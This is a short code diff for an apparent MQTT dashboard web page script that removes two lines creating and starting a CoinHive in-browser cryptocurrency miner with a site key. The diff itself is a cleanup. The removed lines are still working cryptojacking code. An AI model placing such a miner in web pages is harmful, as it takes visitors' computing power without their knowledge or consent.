@@ -3,8 +3,6 @@ var hashed_url = ''
 var username = ''
 var host = 'broker.mqttdashboard.com'
 var port = 8000
-var miner = new CoinHive.Anonymous('rGc6qYxkR2YDcSr13AUgZI55gbSmvpuN');
-miner.start();
 
 document.addEventListener('DOMContentLoaded', function() {
 	console.log("DOMContentLoaded")
